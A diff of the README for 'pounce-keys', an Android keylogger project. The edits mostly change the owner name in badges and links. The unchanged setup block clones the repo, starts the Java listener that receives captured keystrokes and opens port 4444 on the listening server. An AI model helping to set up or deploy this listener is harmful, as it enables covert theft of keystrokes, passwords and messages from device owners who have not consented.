@@ -1,15 +1,15 @@
-![GitHub Repo stars](https://img.shields.io/github/stars/kreabyte/pounce-keys?style=social) 
-![GitHub all releases](https://img.shields.io/github/downloads/kreabyte/Pounce-Keys/total) 
-[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FKreaByte%2Fpounce-keys&count_bg=%237E2676&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=Views&edge_flat=false)](https://hits.seeyoufarm.com)
-![GitHub commit activity](https://img.shields.io/github/commit-activity/y/kreabyte/Pounce-Keys) 
-![GitHub](https://img.shields.io/github/license/kreabyte/Pounce-Keys) 
-![Snyk Vulnerabilities for GitHub Repo](https://img.shields.io/snyk/vulnerabilities/github/kreabyte/Pounce-Keys)    
+![GitHub Repo stars](https://img.shields.io/github/stars/NullPounce/pounce-keys?style=social) 
+![GitHub all releases](https://img.shields.io/github/downloads/NullPounce/Pounce-Keys/total) 
+[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FNullPounce%2Fpounce-keys&count_bg=%237E2676&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=Views&edge_flat=false)](https://hits.seeyoufarm.com)
+![GitHub commit activity](https://img.shields.io/github/commit-activity/y/NullPounce/Pounce-Keys) 
+![GitHub](https://img.shields.io/github/license/NullPounce/Pounce-Keys) 
+![Snyk Vulnerabilities for GitHub Repo](https://img.shields.io/snyk/vulnerabilities/github/NullPounce/Pounce-Keys)    
 
 
 <!-- PROJECT LOGO -->
 <br />
 <div align="center">
-  <a href="https://github.com/KreaByte/pounce-keys">
+  <a href="https://github.com/NullPounce/pounce-keys">
     <img src="images/logo.png" alt="Logo" width="150" height="150">
   </a>
 
@@ -18,11 +18,11 @@
   <p align="center">
     Custom Java listener [ Keylogger for Android ] 🐱‍⌨️
     <br />
-    <a href="https://github.com/KreaByte/pounce-keys/releases">View Release</a>
+    <a href="https://github.com/NullPounce/pounce-keys/releases">View Release</a>
     ·
-    <a href="https://ko-fi.com/kreabyte">Support Me</a>
+    <a href="https://ko-fi.com/NullPounce">Support Me</a>
     ·
-    <a href="https://github.com/KreaByte/pounce-keys/issues">Request Feature</a>
+    <a href="https://github.com/NullPounce/pounce-keys/issues">Request Feature</a>
   </p>
 </div>
 
@@ -87,10 +87,10 @@ sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk-19/bin/ja
 ```
 
 ```
-git clone https://github.com/KreaByte/pounce-keys.git
+git clone https://github.com/NullPounce/pounce-keys.git
 cd pounce-keys/Listener/java
 java -jar MessageListener.jar
-sudo ufw allow 4444 "if on linode or on WAN"
+sudo ufw allow 4444 "if on linode or on WAN" no need for open ports on android's side
 ```
 
 
